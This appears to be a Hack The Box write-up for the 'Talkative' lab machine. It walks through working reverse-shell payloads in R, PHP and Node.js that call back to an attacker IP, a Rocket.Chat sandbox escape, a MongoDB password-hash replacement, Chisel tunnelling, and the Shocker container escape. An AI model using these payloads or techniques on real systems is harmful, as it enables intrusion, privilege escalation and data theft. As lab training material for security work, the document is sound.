<h2 id="attack-chain">Attack chain</h2>
<p>Talkative crosses applications, containers, and the host:</p>
<ul>
<li><strong>Enumerate everything before exploiting anything.</strong> Rushing to exploit the first thing you find wastes time. Map the full attack surface first.</li>
<li><strong>Follow the application logic.</strong> Applications leave clues - product names, usernames, error messages - that point to the next step.</li>
<li><strong>Pivot plan.</strong> On a Hard box, you rarely go straight from external to root. Expect multiple hops: external → container → host → another container → host root.</li>
<li><strong>Credentials reuse everywhere.</strong> Any password you find should be tried on every service available.</li>
<li><strong>Containers are not the end.</strong> Getting root inside a Docker container is not the goal - escaping to the host is.</li>
</ul>

<h2 id="step-3-jamovi-rce-shell-in-container-1">Step 3: Jamovi RCE: Shell in Container 1</h2>
<h3 id="background">Background</h3>
<p>Jamovi is a statistical analysis application that includes an <strong>Rj Editor</strong> - a built-in R language interpreter. R has a <code>system()</code> function that executes OS commands. Since Jamovi runs as root inside a Docker container and has no authentication, we can execute arbitrary OS commands with zero effort.</p>

<p><strong>Start a listener on Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 443
</code></pre>
<p><strong>In Jamovi (<span class="article-lab-address">http://talkative.htb:8080<span> (lab-only address)</span></span>):</strong></p>
<ol>
<li>Click the <strong>Analyses</strong> tab</li>
<li>Click the <strong>R</strong> button → select <strong>Rj Editor</strong></li>
<li>Paste the reverse shell payload:</li>
</ol>
<pre><code class="language-r" data-language="r">system("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/443 0&gt;&amp;1'", intern=TRUE)
</code></pre>
<ol>
<li>Press <strong>Ctrl+Shift+Enter</strong> to execute</li>
</ol>

<p>R's <code>system()</code> function passes commands directly to the OS shell. The <code>intern=TRUE</code> parameter captures stdout. We use bash's <code>/dev/tcp</code> pseudo-device to create a TCP connection back to our machine, redirecting stdin/stdout/stderr through it - giving us an interactive shell.</p>

<pre><code>root@b06821bbda78:/# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>We are <strong>root inside a Docker container</strong>. The hostname (<code>b06821bbda78</code>) is a container ID, confirming we're not on the real host yet.</p>

<ul>
<li><strong>Trust the software's own features.</strong> We didn't exploit a memory corruption bug - we used the application exactly as designed. The built-in R interpreter IS the vulnerability because it was exposed without authentication.</li>
<li><strong>Run as root in containers.</strong> Docker containers often run processes as root internally. This is bad practice but common. Root inside the container means we can do anything within it - including reading sensitive files.</li>
<li><strong>Reverse shells, not bind shells.</strong> We connect back to ourselves (reverse) rather than opening a port on the target (bind), because firewalls typically block inbound connections but allow outbound ones.</li>
</ul>

<h2 id="step-5-bolt-cms-code-execution-shell-in-container-2">Step 5: Bolt CMS Code Execution: Shell in Container 2</h2>
<h3 id="background-2">Background</h3>
<p>Bolt CMS is a PHP-based content management system. When logged in as admin, it allows editing PHP configuration files and Twig templates. We'll abuse the ability to edit <code>bundles.php</code> - a PHP file that's executed when Bolt loads - to inject a reverse shell.</p>

<p><strong>Navigate to Bolt admin:</strong></p>
<pre><code>http://talkative.htb/bolt/login
Username: admin
Password: REDACTED   (matt's password - reused by the admin account)
</code></pre>
<p><strong>Start a listener:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 443
</code></pre>
<p><strong>In Bolt admin:</strong></p>
<ol>
<li>Go to <strong>Configuration → All configuration files</strong></li>
<li>Select <strong>bundles.php</strong></li>
<li>Add a PHP reverse shell immediately after <code>&lt;?php</code>:</li>
</ol>
<pre><code class="language-php" data-language="php">&lt;?php
$sock=fsockopen("10.10.16.84",443,$e,$m,30);
$proc=proc_open("/bin/sh",array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock),$pipes);
</code></pre>
<ol>
<li>Click <strong>Save changes</strong></li>
<li>Visit <code>http://talkative.htb/bolt</code> : loading the dashboard executes <code>bundles.php</code></li>
</ol>

<p><code>bundles.php</code> is a PHP file that Bolt CMS loads as part of its bootstrap process. By injecting PHP code into it, we make the server execute our code every time that file is included. <code>fsockopen</code> opens a TCP connection to our machine, and <code>proc_open</code> spawns a shell with its stdin/stdout/stderr connected to that socket - giving us a shell.</p>
<h3 id="why-not-twig-ssti">Why not Twig SSTI?</h3>
<p>The Twig template injection approach (used in other writeups) can fail due to:</p>
<ul>
<li>Special characters (<code>&gt;&amp;</code>) being HTML-escaped in the template editor</li>
<li>PHP <code>exec()</code> behavior differences between versions</li>
<li>Cache not being cleared properly</li>
</ul>
<p>The <code>bundles.php</code> PHP injection is more reliable because it's direct PHP execution with no intermediary template engine.</p>

<pre><code>id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

hostname -I
172.17.0.8
</code></pre>
<p>We're <strong>www-data inside another Docker container</strong> (172.17.0.8 - the Bolt CMS container).</p>

<ul>
<li><strong>Admin access to a CMS = code execution.</strong> This is almost always true. CMS platforms by design let admins customize the site with code. That's the attack primitive.</li>
<li><strong>When one exploit fails, try another path.</strong> The Twig SSTI is the "textbook" exploit here, but the PHP file edit achieves the same goal with less friction. Hackers are pragmatic - use what works.</li>
<li><strong>Password reuse is endemic.</strong> The credentials from the Jamovi file were for <code>matt@talkative.htb</code>, but they also work for the <code>admin</code> Bolt account. try credentials on every service.</li>
<li><strong>"www-data" is not the end.</strong> We have limited privileges in this container, but it has SSH client installed - which means we can pivot.</li>
</ul>

<h2 id="step-6-ssh-pivot-to-host-user-flag">Step 6: SSH Pivot to Host: User Flag</h2>
<h3 id="background-3">Background</h3>
<p>We're in the Bolt CMS container (172.17.0.8). Docker containers communicate with the host via a bridge network. The <strong>Docker bridge gateway</strong> (<code>172.17.0.1</code> or <code>172.18.0.1</code>) is actually the host machine's IP on the Docker network. Port 22 was filtered from the outside, but <strong>from inside a container, SSH to the host is possible</strong>.</p>

<p><strong>Upgrade the shell first (needed for SSH to work interactively):</strong></p>
<pre><code class="language-bash" data-language="bash">script /dev/null -c bash
</code></pre>
<p><strong>SSH to the host:</strong></p>
<pre><code class="language-bash" data-language="bash">ssh saul@172.18.0.1
# Password: REDACTED
</code></pre>
<p><strong>Grab the user flag:</strong></p>
<pre><code class="language-bash" data-language="bash">cat ~/user.txt
# 4bbc98[redacted]bdc815e47
</code></pre>

<p>The Docker bridge gateway IP (<code>172.18.0.1</code>) is the host machine. The host runs SSH on port 22, but that port is firewalled from the internet. From inside a container on the same Docker network, that firewall rule doesn't apply - we can reach port 22 directly.</p>
<p>The password <code>REDACTED</code> (originally associated with matt's email) is reused by saul's SSH account - another case of credential reuse.</p>
<h3 id="why-172-18-0-1-and-not-172-17-0-1">Why <code>172.18.0.1</code> And not <code>172.17.0.1</code>?</h3>
<p>The machine runs two Docker bridge networks:</p>
<ul>
<li><code>172.17.0.0/16</code> : <code>docker0</code> bridge (where most containers live)</li>
<li><code>172.18.0.0/16</code> : <code>br-ea74c394a147</code> bridge (where Jamovi lives)</li>
</ul>
<p>The Bolt container is on the <code>172.17.0.0</code> network, so the gateway is <code>172.17.0.1</code>. However, both bridge IPs are on the same host - both work for SSH. In practice, try both if one fails.</p>

<ul>
<li><strong>"Filtered" means filtered from outside, not from everywhere.</strong> SSH being filtered externally is irrelevant once you have an internal foothold. Internal networks are often far more permissive.</li>
<li><strong>The gateway is the host.</strong> In Docker environments, <code>172.17.0.1</code> (or whatever the bridge gateway is) is almost always the physical host machine. This is a fundamental Docker networking concept every pentester must know.</li>
<li><strong><code>script /dev/null -c bash</code> is the essential shell upgrade.</strong> Without a proper TTY, SSH won't work interactively (it can't display the password prompt correctly). This one-liner promotes our dumb shell to a proper terminal.</li>
</ul>

<h2 id="step-8-chisel-tunnel-to-mongodb">Step 8: Chisel Tunnel to MongoDB</h2>
<h3 id="background-4">Background</h3>
<p>MongoDB is at <code>172.17.0.2:27017</code> - reachable from the host (saul's shell) but not from our Kali machine. <strong>Chisel</strong> is a TCP tunnel tool that creates a reverse port forward: the target connects OUT to us, and we forward a local port through that connection to MongoDB.</p>

<p><strong>On Kali - start Chisel server:</strong></p>
<pre><code class="language-bash" data-language="bash">chisel server -p 8000 --reverse
</code></pre>
<p><strong>Serve chisel to the target:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 -m http.server 9999 -d /tmp
</code></pre>
<p><strong>On the host (saul's shell) - download and connect:</strong></p>
<pre><code class="language-bash" data-language="bash">cd /dev/shm
wget http://10.10.16.84:9999/chisel
chmod +x chisel
./chisel client 10.10.16.84:8000 R:27017:172.17.0.2:27017
</code></pre>
<p><strong>Result:</strong> Port <code>127.0.0.1:27017</code> on our Kali machine now tunnels directly to <code>172.17.0.2:27017</code> (MongoDB inside the Docker network).</p>
<h3 id="why-chisel">Why Chisel?</h3>
<p>Chisel uses WebSockets over HTTP, which looks like normal web traffic. It works even through strict egress firewalls. The <code>--reverse</code> flag means the CLIENT (target) opens a tunnel to the server (us) and lets the server forward ports. This is critical because we can't reach the target directly on arbitrary ports.</p>

<ul>
<li><strong>Pivoting is a core skill.</strong> You will almost never have a direct path from your machine to every target. Learning to tunnel through intermediate hosts is essential.</li>
<li><strong><code>R:</code> means reverse tunnel.</strong> In Chisel, <code>R:27017:172.17.0.2:27017</code> means "on the server side (Kali), open port 27017 and forward it through the client connection to 172.17.0.2:27017". The R prefix is the key distinction.</li>
<li><strong><code>/dev/shm</code> is your staging area.</strong> It's a RAM-based tmpfs mount that's writable, executable (usually), and gets wiped on reboot. It doesn't show up in disk forensics as easily as writing to <code>/tmp</code> or the home directory.</li>
</ul>

<h3 id="background-5">Background</h3>
<p>Rocket.Chat stores all its data - including user accounts and password hashes - in MongoDB. The database has <strong>no authentication</strong>, meaning anyone who can reach it has full read/write access to everything, including the ability to change any user's password.</p>

<p><strong>Connect to MongoDB from Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">mongo 127.0.0.1:27017
</code></pre>
<p><strong>Enumerate the database:</strong></p>
<pre><code class="language-javascript" data-language="javascript">show databases
// admin, config, local, meteor

use meteor

// Shows: admin user (saul@talkative.htb, roles: ["admin"])
</code></pre>
<p><strong>Reset the admin password to <code>password123</code>:</strong></p>
<pre><code class="language-javascript" data-language="javascript">db.getCollection('users').update(

// WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
</code></pre>
<p>The bcrypt hash <code>$2b$10$P.REDACTED_ENCODED_LAB_MATERIAL</code> is the hash of <code>password123</code>. We copied it from a test account we registered earlier (whose password we set to <code>password123</code>).</p>

<p>Rocket.Chat uses MongoDB as its backend database (it's built on Meteor, which uses MongoDB natively). Password hashes are stored in <code>meteor.users.services.password.bcrypt</code>. Since MongoDB has no auth, we can update this field directly. Rocket.Chat will then accept the new hash when we log in.</p>
<h3 id="log-into-rocket-chat">Log into Rocket.Chat</h3>
<pre><code>http://talkative.htb:3000
Username: admin
Password: REDACTED
</code></pre>

<ul>
<li><strong>No-auth databases are complete compromises.</strong> If you reach an unauthenticated MongoDB, Redis, or Elasticsearch, assume full data access and full application takeover. That service is fully compromised.</li>
<li><strong>You don't need to crack password hashes - replace them.</strong> Cracking bcrypt is computationally expensive. But if you have write access to the database, just replace the hash with one you already know. This is far faster and more reliable.</li>
<li><strong>Admin access to a platform = more code execution.</strong> Just as with Bolt CMS, getting admin access to Rocket.Chat opens up administrative features that can execute code. That's our next step.</li>
</ul>

<h2 id="step-10-rocket-chat-webhook-rce-shell-in-container-3">Step 10: Rocket.Chat Webhook RCE: Shell in Container 3</h2>
<h3 id="background-6">Background</h3>
<p>Rocket.Chat's <strong>Integrations</strong> feature allows admins to create webhooks - HTTP endpoints that execute JavaScript code when triggered. This is a legitimate feature for automating messages and notifications. We abuse it to run a Node.js reverse shell.</p>

<p><strong>Start a listener:</strong></p>
<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
</code></pre>
<p><strong>In Rocket.Chat admin panel:</strong></p>
<ol>
<li>Go to <strong>Administration → Integrations → New Integration</strong></li>
<li>Select <strong>Incoming WebHook</strong></li>
<li>Set <strong>Post to Channel:</strong> <code>#general</code>, <strong>Post as:</strong> <code>rocket.cat</code></li>
<li>Enable <strong>Script</strong> and paste:</li>
</ol>
<pre><code class="language-javascript" data-language="javascript">const require = console.log.constructor('return process.mainModule.require')();
var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(4444, "10.10.16.84", function(){
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
</code></pre>
<ol>
<li>Click <strong>Save Changes</strong> : copy the <strong>Webhook URL</strong> shown at the bottom</li>
<li>Trigger the webhook:</li>
</ol>
<pre><code class="language-bash" data-language="bash">curl http://talkative.htb:3000/hooks/YOUR_ID/YOUR_TOKEN
</code></pre>
<h3 id="why-the-require-bypass-is-needed">Why the <code>require</code> Bypass is needed</h3>
<p>Rocket.Chat's webhook sandbox restricts direct use of <code>require()</code>. The line:</p>
<pre><code class="language-javascript" data-language="javascript">const require = console.log.constructor('return process.mainModule.require')();
</code></pre>
<p>Escapes the sandbox by using <code>Function</code> constructor (accessible via <code>console.log.constructor</code>) to create a new function that returns Node.js's module system. This is a well-known sandbox escape for Rocket.Chat webhook scripts.</p>

<pre><code>id
uid=0(root) gid=0(root) groups=0(root)

hostname
c150397ccd63

hostname -I
172.17.0.3
</code></pre>
<p>Root in the <strong>Rocket.Chat Docker container</strong> (172.17.0.3).</p>

<ul>
<li><strong>"Script execution" features in admin panels ARE code execution.</strong> Webhooks, automation scripts, template engines, cron jobs - if an admin panel lets you run "scripts", that's RCE. Full stop.</li>
<li><strong>Sandbox escapes are well-documented.</strong> The <code>process.mainModule.require</code> trick is documented in countless resources. Before writing custom exploits, search for known bypasses for the specific platform/version you're targeting.</li>
<li><strong>Curl is the simplest exploit trigger.</strong> Once a webhook is configured, a single curl command is all it takes. Simple is better.</li>
</ul>

<h2 id="step-11-container-escape-via-cap-dac-read-search">Step 11: Container Escape via CAP_DAC_READ_SEARCH</h2>
<h3 id="background-7">Background</h3>
<p>Linux capabilities are fine-grained privileges that can be granted to processes independently of full root. The Rocket.Chat container has <code>CAP_DAC_READ_SEARCH</code> - a dangerous capability that <strong>bypasses DAC (Discretionary Access Control) read checks</strong>. Combined with the <code>open_by_handle_at()</code> system call, this allows reading ANY file on the <strong>host filesystem</strong> from inside the container.</p>
<h3 id="verify-the-capability">Verify the capability</h3>
<pre><code class="language-bash" data-language="bash">cat /proc/1/status | grep CapEff
# CapEff: 00000000a80425fd
</code></pre>
<p>Decode with <code>capsh</code>:</p>
<pre><code class="language-bash" data-language="bash">capsh --decode=00000000a80425fd
# includes cap_dac_read_search
</code></pre>
<h3 id="the-shocker-exploit">The Shocker Exploit</h3>
<p>The <strong>Shocker exploit</strong> (<code>shocker.c</code>) abuses <code>open_by_handle_at()</code> - a syscall that opens files by their filesystem inode handle rather than by path. With <code>CAP_DAC_READ_SEARCH</code>, we can:</p>
<ol>
<li>Get a file descriptor to a known file that's bind-mounted into the container (like <code>/etc/hosts</code>)</li>
<li>Use that descriptor to get the filesystem handle for the host's root directory</li>
<li>Walk the host's directory tree by inode to find any file</li>
<li>Open and read that file - even though it's outside our container's filesystem namespace</li>
</ol>
<h3 id="compile-the-exploit-on-kali">Compile the exploit on Kali</h3>
<pre><code class="language-bash" data-language="bash">cd /tmp

# Download shocker.c
wget https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c

# Modify it: change the pivot file from /.dockerinit (doesn't exist on modern systems)
# to /etc/hosts (which IS bind-mounted from the host into the container)
sed -i 's|/.dockerinit|/etc/hosts|g' shocker.c

# Change the target file to read from /etc/shadow to /root/root.txt
sed -i 's|/etc/shadow|/root/root.txt|g' shocker.c

# Verify changes
grep -n "etc/hosts\|root.txt" shocker.c

# Cross-compile for x86_64 (we're on ARM64 Kali, target is x86_64)
x86_64-linux-gnu-gcc -o shocker shocker.c -static
</code></pre>
<h3 id="transfer-to-the-container">Transfer to the container</h3>
<p>Since the container has no <code>wget</code>, <code>curl</code>, or <code>/dev/tcp</code> file access, use <strong>Node.js</strong> (which is available since Rocket.Chat is a Node.js app) to download it:</p>
<p><strong>On Kali - serve the binary:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 -m http.server 9999 -d /tmp
</code></pre>
<p><strong>In the container - download with Node.js and wait for DONE:</strong></p>
<pre><code class="language-bash" data-language="bash">node -e "const h=require('http'),f=require('fs');h.get('http://10.10.16.84:9999/shocker',r=&gt;{const w=f.createWriteStream('/tmp/shocker');r.pipe(w);w.on('finish',()=&gt;{console.log('DONE');process.exit();})});"
</code></pre>
<h3 id="run-the-exploit">Run the exploit</h3>
<pre><code class="language-bash" data-language="bash">chmod +x /tmp/shocker
/tmp/shocker
# Press Enter when prompted
</code></pre>
<h3 id="why-etc-hosts-is-the-pivot-file">Why <code>/etc/hosts</code> Is the pivot file</h3>
<p>The exploit needs a file that is <strong>bind-mounted from the host into the container</strong>. When Docker runs a container, it bind-mounts several host files into the container:</p>
<ul>
<li><code>/etc/hosts</code></li>
<li><code>/etc/hostname</code></li>
<li><code>/etc/resolv.conf</code></li>
</ul>
<p>These files exist in both the container and on the host, sharing the same underlying inode. Shocker uses this shared inode as its "entry point" to walk the host filesystem.</p>
<h3 id="why-dockerinit-doesn-t-work">Why <code>/.dockerinit</code> Doesn't work</h3>
<p>Older Docker versions created <code>/.dockerinit</code> as a marker file inside containers. Modern Docker doesn't. The original shocker.c targets <code>/.dockerinit</code> - we must change this to a file that actually exists.</p>

<ul>
<li><strong>Container ≠ security boundary when capabilities are misconfigured.</strong> Docker containers are NOT VMs. They share the host kernel. Dangerous capabilities like <code>CAP_DAC_READ_SEARCH</code>, <code>CAP_SYS_ADMIN</code>, or <code>CAP_NET_ADMIN</code> can completely undermine container isolation.</li>
<li><strong>Understand what you're exploiting.</strong> The Shocker exploit is elegant - it doesn't break out of the container's filesystem namespace directly. Instead, it uses a legitimate syscall (<code>open_by_handle_at</code>) in an unintended way. Understanding the primitives (inode handles, bind mounts, kernel syscalls) makes you a better attacker and defender.</li>
<li><strong>Cross-compilation is a critical skill.</strong> Your attacker machine is ARM64. The target is x86_64. <code>x86_64-linux-gnu-gcc</code> is the cross-compiler for this. verify the target architecture before compiling.</li>
<li><strong>File transfer is often the hardest part.</strong> No wget, no curl, no /dev/tcp - but Node.js is available. Enumerate what tools exist and find creative solutions. The reasoning is: "if I can't use tool A, what else achieves the same goal?"</li>
</ul>

<pre><code>[!] Win! /root/root.txt output follows:
2158d5[redacted]a1d44b85
</code></pre>
<p>The Shocker exploit reads <code>/root/root.txt</code> directly from the host filesystem, even though we're inside a Docker container.</p>

<h2 id="key-lessons">Key lessons</h2>
<h3 id="1-no-authentication-immediate-exploitation">1. No Authentication = Immediate Exploitation</h3>
<p>Jamovi and MongoDB both had zero authentication. Any service exposed without authentication should be your first target - the attack barrier is essentially zero.</p>
<h3 id="2-credentials-found-anywhere-used-everywhere">2. Credentials Found Anywhere, Used Everywhere</h3>
<p>A Jamovi spreadsheet file contained Bolt CMS credentials. Those same credentials worked for SSH. spray every credential you find against every service available.</p>
<h3 id="3-admin-cms-access-code-execution">3. Admin CMS Access = Code Execution</h3>
<p>Whether it's Bolt CMS, WordPress, or Rocket.Chat - admin access to a web application that supports custom scripts/templates/plugins is effectively code execution. This is by design, and attackers abuse it regularly.</p>
<h3 id="4-docker-is-not-a-security-boundary">4. Docker is Not a Security Boundary</h3>
<p>Containers share the host kernel. Misconfigured capabilities (<code>CAP_DAC_READ_SEARCH</code>), exposed Docker sockets, or privileged containers can completely break container isolation. Do not assume root-in-container is safe.</p>
<h3 id="5-internal-services-are-often-unprotected">5. Internal Services Are Often Unprotected</h3>
<p>MongoDB had no auth because "only internal containers can reach it." This false sense of security is extremely common. Once you pivot inside the network, internal services become your attack surface.</p>
<h3 id="6-pivoting-is-the-core-skill">6. Pivoting is the Core Skill</h3>
<p>This box required 6 distinct hops to get the root flag. Enumeration at each step revealed the next target. The ability to pivot - through containers, across Docker networks, via tunnels - is what separates average pentesters from great ones.</p>
<h3 id="7-when-one-exploit-fails-try-another">7. When One Exploit Fails, Try Another</h3>
<p>The Twig SSTI approach for Bolt CMS didn't work in our environment. We pivoted to PHP file injection and achieved the same result. Hackers don't give up when the first technique fails - they adapt.</p>
<h3 id="8-understand-your-tools">8. Understand Your Tools</h3>
<p>Knowing WHY Shocker works (bind mounts + <code>open_by_handle_at()</code> + <code>CAP_DAC_READ_SEARCH</code>) lets you adapt it when the default target file (<code>/.dockerinit</code>) doesn't exist. Blindly running tools without understanding them leads to failure when conditions differ from the tutorial.</p>
